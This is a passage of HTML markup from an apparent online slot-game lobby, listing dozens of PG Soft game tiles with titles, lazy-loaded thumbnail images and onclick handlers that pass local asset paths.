                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Majestic Treasures" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Majestic Treasures', '/assets/games/i/165x220/pgshoft/d8c8dacb75b233ede1e4eb35d13efa9d.webp?v=0.1' , '95', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/d8c8dacb75b233ede1e4eb35d13efa9d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Majestic Treasures">Majestic Treasures</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Guardians of Ice and Fire" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Guardians of Ice and Fire', '/assets/games/i/165x220/pgshoft/830e9627209bad6a2f4d2dd65621a2d6.webp?v=0.1' , '91', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/830e9627209bad6a2f4d2dd65621a2d6.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Guardians of Ice and Fire">Guardians of Ice and Fire</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Galactic Gems" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Galactic Gems', '/assets/games/i/165x220/pgshoft/57ab34ff56babfdb218c03bd2b21e26b.webp?v=0.1' , '86', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/57ab34ff56babfdb218c03bd2b21e26b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Galactic Gems">Galactic Gems</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jack Frosts Winter" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jack Frosts Winter', '/assets/games/i/165x220/pgshoft/5cf8f4950fb29742ff03614b7e391380.webp?v=0.1' , '97', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/5cf8f4950fb29742ff03614b7e391380.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jack Frosts Winter">Jack Frosts Winter</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Opera Dynasty" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Opera Dynasty', '/assets/games/i/165x220/pgshoft/ecdde521ea3fed2e9d631a315bd8326a.webp?v=0.1' , '93', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/ecdde521ea3fed2e9d631a315bd8326a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Opera Dynasty">Opera Dynasty</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jewels of Prosperity" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jewels of Prosperity', '/assets/games/i/165x220/pgshoft/cc05e7c88ff859e2ab1ff75cbf279bdf.webp?v=0.1' , '88', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/cc05e7c88ff859e2ab1ff75cbf279bdf.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jewels of Prosperity">Jewels of Prosperity</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Vampire&amp;quot;amp;s Charm" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Vampire&amp;quot;amp;s Charm', '/assets/games/i/165x220/pgshoft/cca314f86f5ea16415bbfff76f49410b.webp?v=0.1' , '58', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/cca314f86f5ea16415bbfff76f49410b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Vampire's Charm">Vampire's Charm</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Secret of Cleopatra" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Secret of Cleopatra', '/assets/games/i/165x220/pgshoft/a9371c514d84a00db9fd577314ab8022.webp?v=0.1' , '90', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/a9371c514d84a00db9fd577314ab8022.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Secret of Cleopatra">Secret of Cleopatra</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Thai River Wonders" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Thai River Wonders', '/assets/games/i/165x220/pgshoft/5a1695f86bf931e91a07d1b722366802.webp?v=0.1' , '92', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/5a1695f86bf931e91a07d1b722366802.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Thai River Wonders">Thai River Wonders</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Circus Delight" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Circus Delight', '/assets/games/i/165x220/pgshoft/cc01391562e2d30aaf8d2ee268874d40.webp?v=0.1' , '80', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/cc01391562e2d30aaf8d2ee268874d40.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Circus Delight">Circus Delight</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Fireworks" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Fireworks', '/assets/games/i/165x220/pgshoft/0a2b3a3af04db3b95fecc45957048ecb.webp?v=0.1' , '83', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/0a2b3a3af04db3b95fecc45957048ecb.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Fireworks">Wild Fireworks</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Genie&amp;quot;amp;s 3 Wishes" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Genie&amp;quot;amp;s 3 Wishes', '/assets/games/i/165x220/pgshoft/eb9aaa4f773b94678d4b2b7a81ae270b.webp?v=0.1' , '85', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/eb9aaa4f773b94678d4b2b7a81ae270b.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Genie's 3 Wishes">Genie's 3 Wishes</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Phoenix Rises" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Phoenix Rises', '/assets/games/i/165x220/pgshoft/514ec5d541e1de6e17a11063f2b0fee1.webp?v=0.1' , '82', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/514ec5d541e1de6e17a11063f2b0fee1.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Phoenix Rises">Phoenix Rises</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Egypt&amp;quot;amp;s Book of Mystery" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Egypt&amp;quot;amp;s Book of Mystery', '/assets/games/i/165x220/pgshoft/f4217e8c253065c8315d5e3c788de2e7.webp?v=0.1' , '73', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/f4217e8c253065c8315d5e3c788de2e7.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Egypt's Book of Mystery">Egypt's Book of Mystery</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Candy Burst" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Candy Burst', '/assets/games/i/165x220/pgshoft/f9d9797e22bc6672d497a7bba4a83c01.webp?v=0.1' , '70', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/f9d9797e22bc6672d497a7bba4a83c01.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Candy Burst">Candy Burst</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bikini Paradise" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bikini Paradise', '/assets/games/i/165x220/pgshoft/7cb0dc6e94d67f3b754bdc64bee874ef.webp?v=0.1' , '69', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/7cb0dc6e94d67f3b754bdc64bee874ef.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bikini Paradise">Bikini Paradise</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Shaolin Soccer" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Shaolin Soccer', '/assets/games/i/165x220/pgshoft/00ded50b471ff443c6c13c7d0af69ef5.webp?v=0.1' , '67', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/00ded50b471ff443c6c13c7d0af69ef5.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Shaolin Soccer">Shaolin Soccer</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Hatch" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Hatch', '/assets/games/i/165x220/pgshoft/73c181500a52871929efe9be4b98dfb0.webp?v=0.1' , '57', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/73c181500a52871929efe9be4b98dfb0.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Hatch">Dragon Hatch</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Mouse" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Mouse', '/assets/games/i/165x220/pgshoft/f2cb78bf5b7a5eef3491ed33888c56c3.webp?v=0.1' , '68', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/f2cb78bf5b7a5eef3491ed33888c56c3.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Mouse">Fortune Mouse</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Reel Love" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Reel Love', '/assets/games/i/165x220/pgshoft/ad09b509b669ac41791fe18fcdd31d5a.webp?v=0.1' , '20', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/ad09b509b669ac41791fe18fcdd31d5a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Reel Love">Reel Love</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gem Saviour Conquest" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gem Saviour Conquest', '/assets/games/i/165x220/pgshoft/00c87ce7d70c283a06f38af6c525c329.webp?v=0.1' , '62', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/00c87ce7d70c283a06f38af6c525c329.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gem Saviour Conquest">Gem Saviour Conquest</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Tiger Luck" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Tiger Luck', '/assets/games/i/165x220/pgshoft/6c19575fcfbb1689a1bac5160e3fdaf7.webp?v=0.1' , '63', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/6c19575fcfbb1689a1bac5160e3fdaf7.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Tiger Luck">Dragon Tiger Luck</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Flirting Scholar" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Flirting Scholar', '/assets/games/i/165x220/pgshoft/19342af97e939c7387c9ceedf569e979.webp?v=0.1' , '61', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/19342af97e939c7387c9ceedf569e979.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Flirting Scholar">Flirting Scholar</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ninja vs Samurai" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ninja vs Samurai', '/assets/games/i/165x220/pgshoft/3dbe5281fd3c8cc20a7db56682f225ff.webp?v=0.1' , '59', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/3dbe5281fd3c8cc20a7db56682f225ff.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ninja vs Samurai">Ninja vs Samurai</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Leprechaun Riches" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Leprechaun Riches', '/assets/games/i/165x220/pgshoft/464b31bc90ef06a17f23ea525dca296c.webp?v=0.1' , '60', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/464b31bc90ef06a17f23ea525dca296c.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Leprechaun Riches">Leprechaun Riches</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Muay Thai Champion" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Muay Thai Champion', '/assets/games/i/165x220/pgshoft/7d7ff54e61c994c74257255b77399559.webp?v=0.1' , '64', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/7d7ff54e61c994c74257255b77399559.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Muay Thai Champion">Muay Thai Champion</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Captain&amp;quot;amp;s Bounty" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Captain&amp;quot;amp;s Bounty', '/assets/games/i/165x220/pgshoft/28a6345f420340f65c1d434d63386ecd.webp?v=0.1' , '54', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/28a6345f420340f65c1d434d63386ecd.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Captain's Bounty">Captain's Bounty</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Journey to the Wealth" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Journey to the Wealth', '/assets/games/i/165x220/pgshoft/76895107bf295d95dd2c038ca8bb442a.webp?v=0.1' , '50', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/76895107bf295d95dd2c038ca8bb442a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Journey to the Wealth">Journey to the Wealth</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Jungle Delight" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Jungle Delight', '/assets/games/i/165x220/pgshoft/72f6c8de324a9d71a184997ee9f694a5.webp?v=0.1' , '40', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/72f6c8de324a9d71a184997ee9f694a5.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Jungle Delight">Jungle Delight</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Double Fortune" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Double Fortune', '/assets/games/i/165x220/pgshoft/fa5d6d9f8bfd764d4cf47f20020cd6ef.webp?v=0.1' , '48', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/fa5d6d9f8bfd764d4cf47f20020cd6ef.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Double Fortune">Double Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Medusa" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Medusa', '/assets/games/i/165x220/pgshoft/5f1b2facd673b62edf7ddd129718953f.webp?v=0.1' , '7', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/5f1b2facd673b62edf7ddd129718953f.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Medusa">Medusa</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Plushie Frenzy" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Plushie Frenzy', '/assets/games/i/165x220/pgshoft/a708e854ac9f703306d1594ae9b1dd86.webp?v=0.1' , '25', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/a708e854ac9f703306d1594ae9b1dd86.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Plushie Frenzy">Plushie Frenzy</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Dragon Legend" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Dragon Legend', '/assets/games/i/165x220/pgshoft/a0135a1084669a9fb9c258dde66187a6.webp?v=0.1' , '29', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/a0135a1084669a9fb9c258dde66187a6.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Dragon Legend">Dragon Legend</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gem Saviour Sword" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gem Saviour Sword', '/assets/games/i/165x220/pgshoft/a7a621c4a9bfa68536bc97036f972ba2.webp?v=0.1' , '38', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/a7a621c4a9bfa68536bc97036f972ba2.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gem Saviour Sword">Gem Saviour Sword</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mr. Hallow-Win" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mr. Hallow-Win', '/assets/games/i/165x220/pgshoft/905a001ecd48e34ebd3990589ffb142c.webp?v=0.1' , '35', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/905a001ecd48e34ebd3990589ffb142c.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mr. Hallow-Win">Mr. Hallow-Win</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Piggy Gold" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Piggy Gold', '/assets/games/i/165x220/pgshoft/974f937037e8d4e31d2ca1b2363f93ea.webp?v=0.1' , '39', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/974f937037e8d4e31d2ca1b2363f93ea.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Piggy Gold">Piggy Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gem Saviour" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gem Saviour', '/assets/games/i/165x220/pgshoft/f9b27d339829fdfaaa69eb550747be81.webp?v=0.1' , '2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/f9b27d339829fdfaaa69eb550747be81.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gem Saviour">Gem Saviour</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ganesha Gold" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ganesha Gold', '/assets/games/i/165x220/pgshoft/e388eb545fb49b8ca21bd467bb8b637a.webp?v=0.1' , '42', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/e388eb545fb49b8ca21bd467bb8b637a.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ganesha Gold">Ganesha Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Tree of Fortune" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Tree of Fortune', '/assets/games/i/165x220/pgshoft/6db891c2019963a127af99b7e9d2f2ce.webp?v=0.1' , '26', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/6db891c2019963a127af99b7e9d2f2ce.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Tree of Fortune">Tree of Fortune</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Santa&amp;quot;amp;s Gift Rush" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Santa&amp;quot;amp;s Gift Rush', '/assets/games/i/165x220/pgshoft/10663c027f800c60ea2938053e808da1.webp?v=0.1' , '37', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/10663c027f800c60ea2938053e808da1.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Santa's Gift Rush">Santa's Gift Rush</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Emperor&amp;quot;amp;s Favour" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Emperor&amp;quot;amp;s Favour', '/assets/games/i/165x220/pgshoft/0e864bec306d3b2cc651069a66610d9d.webp?v=0.1' , '44', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/0e864bec306d3b2cc651069a66610d9d.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Emperor's Favour">Emperor's Favour</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hotpot" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hotpot', '/assets/games/i/165x220/pgshoft/9b56f0bbf9e9b9735e2a2104780ff0cb.webp?v=0.1' , '28', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class="lazy" data-src="/assets/games/i/165x220/pgshoft/9b56f0bbf9e9b9735e2a2104780ff0cb.webp?v=0.1" src="" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hotpot">Hotpot</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Prosperity Lion" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Prosperity Lion', '/assets/games/i/165x220/pgshoft/ac96d97b54fa2e59a68780b080d1fc9e.webp?v=0.1' , '36', '' )" style="">

          <div class="content-wrapper">
              
